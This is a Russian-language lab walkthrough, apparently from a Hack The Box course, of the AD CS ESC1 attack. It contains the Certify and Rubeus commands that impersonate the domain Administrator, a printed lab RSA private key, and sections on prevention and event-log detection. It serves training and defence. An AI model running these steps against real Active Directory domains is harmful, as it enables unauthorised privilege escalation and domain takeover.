=====================================================================
* Руководство *
***************

Это пошаговое руководство, цель которой — продемонстрировать проблему, а не подробно описать атаку.

Атака будут выполняться с предоставленных машин Windows 10 (WS001) и Kali Linux.
Предполагается, что злоумышленник уже получил remote code execution (или что-то подобное) на этой машине Windows 10 (WS001).
Пользователь, который, как мы предполагаем, скомпрометирован, — это Боб, обычный пользователь в Active Directory без назначенных специальных разрешений.

Окружение состоит из следующих машин и соответствующих им IP-адресов:

	-	DC1			172.16.18.3
	-	DC2			172.16.18.4
	-	Server01	172.16.18.10
	-	PKI			172.16.18.15
	-	WS001		DHCP или 172.16.18.25 (в зависимости от раздела)
	-	Kali Linux	DHCP или 172.16.18.20 (в зависимости от раздела)

Если надо подключиться к любой из управляющих машин AD сервера (к примеру - DC1)

	i)			Поключаемся к хосту жертвы через RDP
	ii)			Пуск -> Windows Accessories -> Remote Desktop
	iii)		Computer	=	DC1 ip address
				User Name	=	Имя пользователя (к примеру htb-student)
	iv)			Пароль введем позже (будет предоставлен запрос)
	v)			Соглашаемся на устанвку соединения

*** Если для атаки необходимо использовать бот-хост, через который будет установленно RDP соединение с хостом (или серверами домена), то рекомендуется сначала подключиться по SSH к хосту Kali, включив динамическую переадресацию портов
	Это повысит производительность RDP соединения
	А затем подключиться по RDP  с вашего атакующего хоста с использованием proxychains
	Детальную инструкцию можно найти тут	-	Dynamic Port Forwarding with SSH and SOCKS Tunneling (https://academy.hackthebox.com/module/158/section/1426)
	Если доступа к статье нет, то ищите у меня разделе PenTest

=====================================================================
* Легенда *
***********

После того, как SpectreOps выпустила исследовательскую работу Certified Pre-Owned (https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf), службы сертификатов Active Directory (AD CS) стали одним из самых любимых векторов атак для агентов угроз по многим причинам, включая:

	1)	Использование сертификатов для аутентификации имеет больше преимуществ, чем обычные учетные данные имени пользователя/пароля.

	2)	Большинство серверов PKI были неправильно настроены/уязвимы по крайней мере для одной из восьми атак, обнаруженных SpectreOps (позже было обнаружено гораздо больше вариантов проникновения).

Использование сертификатов и компрометация центра сертификации (CA) имеет множество преимуществ:

	-	Сертификаты пользователей и машин действительны в течение 1+ года.

	-	Сброс пароля пользователя не делает сертификат недействительным.
		С сертификатами неважно, сколько раз пользователь меняет свой пароль
		Сертификат все равно будет действителен (если не истек срок его действия или он не был отозван).

	-	Неправильно настроенные шаблоны позволяют получить сертификат для любого пользователя.

	-	Компрометация закрытого ключа CA приводит к подделке золотых сертификатов (Golden Certificates)

Эти преимущества делают сертификаты предпочтительным методом для долгосрочного сохранения.
Хотя SpectreOps раскрыл восемь методов повышения привилегий, мы рассмотрим первый, ESC1, чтобы продемонстрировать, как он работает. 

Описание ESC1:

	-	Domain escalation via No Issuance Requirements + Enrollable Client Authentication/Smart Card Logon OID templates + CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT. 

=====================================================================
* Схема атаки *
***************

!!!	Небольшое отступление !!!

В данном задание (да и желательно во всех предыдущих), когда мы подключаемся от Linux машины к Windows машине через xfreerdp использовать следующую команду
Так как данная команда создает общиq диск для обмена файлами

	:$ xfreerdp /u:<domain_name\\user_name> /p:<password> /v:<target_ip> /drive:Linuxshare,<path_to_shared_folder_on_linux> /dynamic-resolution

Теперь в Windows в "Этот компьютер" появится диск LinuxFiles, где можно забирать файлы.

Итак, для начала мы воспользуемся Certify  (для сканирования среды на наличие уязвимостей в инфраструктуре PKI:
***	Certify (https://github.com/GhostPack/Certify) - — это инструмент C# для перечисления и выявления неверных настроек в службах сертификации Active Directory (AD CS).

	PS C:\...\...\...> .\Certify.exe find /vulnerable

При проверке раздела «Vulnerable Certificate Templates» в выводе Certify мы увидим, что указан один шаблон с большим количеством информации о нем.
Но больше всего нас интересуют следующие поля в нем:

	-	Template Name					: UserCert
		Указывает название уязвимого сертификата
	
	-	Validity Period					: 10 years
		Показывает срок действия сертификата
	
	-	msPKI-Certificates-Name-Flag	: ENROLLEE_SUPPLIES_SUBJECT
		Говорит о том, что независимо о того, кто запрашивает сертификат, он может указывать для кого сертификат выпущен
	
	-	pkiextendedkeyusage				: Client Authentication, ...
		Означает, что сертификат может быть использован для аутентификации
	
	-	Enrollment Rights				: EAGLE\Domain Users 
		Указывает на того, кто может запрашивать сертификат из этого образца

Мы можем сказать, что имя CA Name в среде — PKI.eagle.local\eagle-PKI-CA, а уязвимый шаблон называется UserCert.
Шаблон уязвим, потому что:

	-	Все пользователи домена могут запросить сертификат по этому шаблону.
	-	Присутствует флаг CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT, позволяющий запрашивающей стороне указать SAN 
		Cледовательно, любой пользователь может запросить сертификат, как и любой другой пользователь в сети, включая привилегированных.
	-	Одобрение менеджера не требуется (сертификат выдается сразу после запроса без одобрения).
	-	Сертификат можно использовать для «Client Authentication» (мы можем использовать его для входа/аутентификации).

Чтобы использовать данный шаблон для проникновения, мы воспользуемся Certify и передадим запрос аргумента, указав:

	-	CA Name
	-	Template Name
	-	Altname (Имя пользователя, кем мы хотим прикинуться, например Администратор)

			PS C:\...\...\...> .\Certify.exe request /ca:PKI.eagle.local\eagle-PKI-CA /template:UserCert /altname:Administrator

После завершения атаки мы успешно получим сертификат.
Команда генерирует сертификат PEM и отображает его как base64.

Далее нам нужно скопировать RSA Private Key и CERTIFICATE и сохранить их на хосте, с которого мы подключилися к хосту-жертве (ну тот что в домене)
Сохраним в файле под названием cert.PEM

	-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA6owR4pvoh/zW+8xv5OR9EqU2HB97b1l6U/hocfapsO++/+a6
DzAxUJ4q2wxjEMfNB0ThVvlwOEMkPMpkBhC8pYMbeyt25WAzBTa8UehjKDJQINmx
Q6iUp51rE40ICkrop+2SjQizKkTKuFy6BJUnFIIM52r1EiKgaC16lib+KZlcmniB
bTHiOvAfG+cYCSRmluHNlrwng1GQmX2AnsK+ZSDXth0Ih5z1jdDYFBiV9RXf0F6w
cwzy8kQjIOqpYHU/evkMsARTEugR/UjEFg2IJDmfFhfXtzrS04QMtCHGGiCfim9g
3JGy3xIHLP8llmdLJdNF6TVBDlNU8mMmd7FEdQIDAQABAoIBABdLdBdKnsyqyvtV
MaPNIbLxX69pXQwRGfovCMiQ1AezuAeYddA+XBeCrgT1dP1cqrtXFv5ZZdDgsj+r
ZkXH8cSKgfc4uOVNKaQR7KBB8V8zqAurM1Th8Gm5U8IsVqkXCYZsLQr+2zSOgofP
BdagrbH2vKtbTx3O/Jl8Mtmo48NjvECUaAv1d1GKVzyvSa4ooKIqX98K2cozRvvO
QKFHDzq7KMNhvSa95C836b4Hm2hGcwyyCHdMZrZJ9kM6kd5p4ijJ+68kW8XX3LqZ
9XTrJffbI2f27MUN/obt3dQ1fGnqL/EYSne8rSJV/5YtFMjeBkEHdRuGFMQypMHf
z08emn0CgYEA/SMXJgOkprQE4Xoj6kq+mUfOYck6tssBhpVf2+wSyhWE4FtDJqYU
T8snxFomI3Ssy1BxSGVybHlYwPvezhtnU/Gs3GPk8KA7oNJ6CxGDq5s7tUnam8yE
C1smG1AY5uAn8Y3DcJeDEkFLyyNlVoF4l/AcTPsO1DGBLS3PvPgQ9H8CgYEA7TMn
6RCvSBK2MXBDsf5WHg/VKPbkUqty9QKwzLcawU7YwE+LKWdVUxWGd9LocLJxrjxQ
yZQyVtsPn8R/U3aewCDy+CED21dGW5iXG4tqy4tY88ibmPkKGM7WqB2fDKMTyKRJ
oV9S8u8QiECjA4LKAA8QhZNeYXIkMyc7nrcLvQsCgYEAzeMUmN6ttMkGjz4AqDdS
/ujge7hoAPTssMIdzYodXjBSewi/fVfnfV8HYTTRgFUNlfA/s1qPzpqEDbLObWTs
jeIrbrXxJ6Wr2gpXKVl9dr4zuifvnnihjXr9a4miN2ZqFpXvOEyDVv203+xSKCH2
K94nppUsYnpBTrXMGS7K25ECgYBg0SaTLOo+otSW7VnURxnjf1bkN5IOZEix1P1R
MdPL32D9bfpBVhovpXOTaRTTGyLnmVroTIMXjKad8dh+usYlac2Clgc6+i6PqILV
DVzz49bU+qb4E36ZjaN0T1LiF5Y1qUkcgwoaepXm52siPboxt/RocTRu1eYMsxDU
waYa7QKBgGJPNrtiRIJEeuywiwD3IBylQk71e5iC2tjW0a01SI35c0mmwYdcw5KL
omSXNiNGBk8gNFhocUdqzbNJRZEgEcnjFmhurz3kUEE9N5PfePVmpwJ1b8uJoz5A
Ztg3FI49V6Lm+Y7KUAVZkXTeVIEWMjlsknX4oeyumPvPEFmko94+
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGLzCCBRegAwIBAgITFgAAADmak51LgBj1AAAAAAAAOTANBgkqhkiG9w0BAQsF
ADBFMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxFTATBgoJkiaJk/IsZAEZFgVlYWds
ZTEVMBMGA1UEAxMMZWFnbGUtUEtJLUNBMB4XDTI1MDIxMjIyMTk1MVoXDTM1MDIx
MDIyMTk1MVowUTEVMBMGCgmSJomT8ixkARkWBWxvY2FsMRUwEwYKCZImiZPyLGQB
GRYFZWFnbGUxEzARBgNVBAsTCkVhZ2xlVXNlcnMxDDAKBgNVBAMTA2JvYjCCASIw
DQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAOqMEeKb6If81vvMb+TkfRKlNhwf
e29ZelP4aHH2qbDvvv/mug8wMVCeKtsMYxDHzQdE4Vb5cDhDJDzKZAYQvKWDG3sr
duVgMwU2vFHoYygyUCDZsUOolKedaxONCApK6Kftko0IsypEyrhcugSVJxSCDOdq
9RIioGgtepYm/imZXJp4gW0x4jrwHxvnGAkkZpbhzZa8J4NRkJl9gJ7CvmUg17Yd
CIec9Y3Q2BQYlfUV39BesHMM8vJEIyDqqWB1P3r5DLAEUxLoEf1IxBYNiCQ5nxYX
17c60tOEDLQhxhogn4pvYNyRst8SByz/JZZnSyXTRek1QQ5TVPJjJnexRHUCAwEA
AaOCAwowggMGMD4GCSsGAQQBgjcVBwQxMC8GJysGAQQBgjcVCIXA2V2Evq86gv2J
DIa5zBKD/tVZgV2H9L4xhO/rCAIBZAIBBTA1BgNVHSUELjAsBgorBgEEAYI3FAIC
BggrBgEFBQcDBAYKKwYBBAGCNwoDBAYIKwYBBQUHAwIwDgYDVR0PAQH/BAQDAgWg
MEMGCSsGAQQBgjcVCgQ2MDQwDAYKKwYBBAGCNxQCAjAKBggrBgEFBQcDBDAMBgor
BgEEAYI3CgMEMAoGCCsGAQUFBwMCMEQGCSqGSIb3DQEJDwQ3MDUwDgYIKoZIhvcN
AwICAgCAMA4GCCqGSIb3DQMEAgIAgDAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNV
HQ4EFgQU5a9TGxv81aaEZDDmyy/8oRlSKtQwKAYDVR0RBCEwH6AdBgorBgEEAYI3
FAIDoA8MDUFkbWluaXN0cmF0b3IwHwYDVR0jBBgwFoAUfAmV68CG4/FlbH3xp2ae
5awKC2UwgcYGA1UdHwSBvjCBuzCBuKCBtaCBsoaBr2xkYXA6Ly8vQ049ZWFnbGUt
UEtJLUNBLENOPVBLSSxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMs
Q049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1lYWdsZSxEQz1sb2NhbD9j
ZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlz
dHJpYnV0aW9uUG9pbnQwgb4GCCsGAQUFBwEBBIGxMIGuMIGrBggrBgEFBQcwAoaB
nmxkYXA6Ly8vQ049ZWFnbGUtUEtJLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXkl
MjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPWVhZ2xl
LERDPWxvY2FsP2NBQ2VydGlmaWNhdGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZp
Y2F0aW9uQXV0aG9yaXR5MA0GCSqGSIb3DQEBCwUAA4IBAQCe3SnBFH+uFoWE3RSX
8IGBC6S1IR6FMrMqSEXbYtGTq/sOfFzEZKZkKJ29fV3vp14K3BUjvaG7We6qxF2E
2X3qyAWPxyb4k2SwS5KmOgUAVUKc2nblx1ttUFV0jMRX+Ns/PPBBc+s0xQ0V4aQw
SJl2jvjh25RLhvuBEuyoWw580AetHHU1T3Lrn5qh9uccl7PpKioeyMb+vi/3HQdQ
CgMFpAz9LA8abkrL1tMLBbprljT6mVLK5WzBFmgXkMxcT/wSCdRHAA5Cpm5c6ypA
tMqYl7bAvIm9rklcvFy+tiowKVzaMCoU4Yod04sL7b9uKDGjF6rwGqtOi2AsKO4n
kGcC
-----END CERTIFICATE-----

Оригинальный гайд рекомендует (после сохранения ключа и сертификата) применить следующую командну
Данная команда призвна избежать плохого форматирования файла PEM.
Хотя, CHAT-GPT не советует ее использовать с сертификатами pem

	<bot_host_user_name>@~$ sed -i 's/\s\s\+/\n/g' cert.pem

Затем Нам нужно преобразовать сертификат PEM в формат PFX, выполнив команду, указанную в выводе Certify
***	Rогда будет запрошен пароль, нажмите Enter, не предоставляя его

	<bot_host_user_name>@~$ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
	Enter Export Password:
	Verifying - Enter Export Password:

Теперь, когда у нас есть сертификат в пригодном для использования формате PFX (который поддерживает Rubeus), мы можем запросить Kerberos TGT для учетной записи Administrator и пройти аутентификацию с помощью сертификата
Но сперва нам надо перенести его с Linux машины на Windows машину
Для этого мы используем общий (между Linux и Windows машина) диск, созданный в самом начале атаки
После переноса, используем следующую комнаду

	PS C:\...\...\...> .\Rubeus.exe asktgt /domain:<domain_name>.local /user:Administrator /certificate:<cert_name>.pfx /dc:<domain_controller_name>.eagle.local /ptt

После успешной аутентификации мы сможем просмотреть содержимое общего ресурса C$ на DC1:

	PS C:\...\...\...> dir \\dc1\c$

=====================================================================
* Предотвращение/защита *
*************************

Вот несколько ключевых моментов, которые могут предотвратить проникновение посредством этой атаки:

	-	Атака невозможна, если флаг CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT не включен в шаблоне сертификата.

	-	Другой способ предотвратить эту атаку — потребовать одобрения менеджера сертификатов CA перед выдачей сертификатов;
		Это гарантирует, что сертификаты по потенциально опасным шаблонам не будут выдаваться без ручного одобрения (которое, как мы надеемся, подтверждает, что запрос поступил от законного пользователя).

	-	Поскольку существует множество различных методов повышения привилегий, настоятельно рекомендуется регулярно сканировать среду с помощью Certify или других подобных инструментов для поиска потенциальных проблем PKI.

=====================================================================
* Обнаружение *
***************

Когда CA генерирует сертификат, будут зарегистрированы два события

	1)	одно для полученного запроса							(4886	-	Certificate Services received a certificate request)
	2)	одно для выданного сертификата, если он будет успешным	(4887	-	Certificate Services approved a certificate request and issued a certificate)

К сожалению, мы можем сказать только то, что пользователь, который был скопроментирован, запросил сертификат у WS001
Но мы не можем знать, был ли в запросе указан SAN.
Обратите внимание, что события 4886 и 4887 будут сгенерированы на машине, выдавшей сертификат, а не на контроллере домена.
Если доступ к GUI недоступен, мы можем использовать PSSession для взаимодействия с машиной PKI (той, которая выдает сертификаты) и командлет Get-WinEvent для поиска событий
Для этого, сперва запустим CMD от имени другого пользователя для запуска powershell

	C:\...\...\...> runas /user:eagle\htb-student powershell

Потом в появившемся окне (от имень другого пользователя) powershell запустим следующую команду для создания удаленного канала с сервером PKI

	PS C:\...\...\...> New-PSSession PKI

После того как удаленный канал создан и установлен, используем следующую комнаду для запуска Powershell терминала на удаленном серевере PKI, чтобы иметь возможность запускать нужыне команды
К примеру:

	-	[PKI]: PS C:\...\...\...> Get-WINEvent -FilterHashtable @{Logname='Security'; ID='4886'}
		Эта команда ищет в журнале событий Windows (Event Log) события с ID 4886 в журнале Security (Безопасность).
	
Чтобы просмотреть полный журнал аудита событий, мы можем передать вывод в Format-List или сохранить события в массиве и проверять их по отдельности:

	-	[PKI]: PS C:\...\...\...> $events = Get-WinEvent -FilterHashtable @{Logname='Security'; ID='4886'}
	-	[PKI]: PS C:\...\...\...> $events[0] | Format-List -Property *


Также CA содержит список всех выданных сертификатов, поэтому, если мы посмотрим туда, то увидим запрос на сертификат с идентификатором ##

Общий обзор сертификата, также не отображает SAN, но мы можем сказать, что сертификат был выпущен через уязвимый шаблон.
Если мы хотим найти информацию о SAN, нам нужно будет открыть сам сертификат

Также есть возможность просмотреть это программно с помощью встроенной утилиты-	certutil -view
Она выведет на центр сертификации всю информацию о каждом сертификате (в большой среде это может быть очень много)
Нас интересуют следующие поля:

	-	Issued Common Name: <user_name>
	...SNIP...
	-	SAN: "upn=Administrator"
	...SNIP...
	-	ccm: "<server_name>.<domain_name>.local"
	...SNIP...
	-	Template=UserCert(#.#.#.#.....)

Данный вывод говорит о том, что user_name запросил сертификат для Administrator с <server_name>.<domain_name>.local для template UserCert
***	С помощью некоторых скриптов мы можем автоматизировать разбор и обнаружение злоупотребляемых уязвимых шаблонов агентами угроз.

Наконец, если вы помните, в атаке мы использовали полученный сертификат для аутентификации и получили TGT
AD зарегистрирует этот запрос с идентификатором события 4768 (A Kerberos authentication ticket (TGT) was requested), который будет содержать информацию о попытке входа с сертификатом:

=====================================================================
* Ловушка/Honeypot *
********************

К сожалению вариантов с ловушкой для данного вида атаки представлено не было
		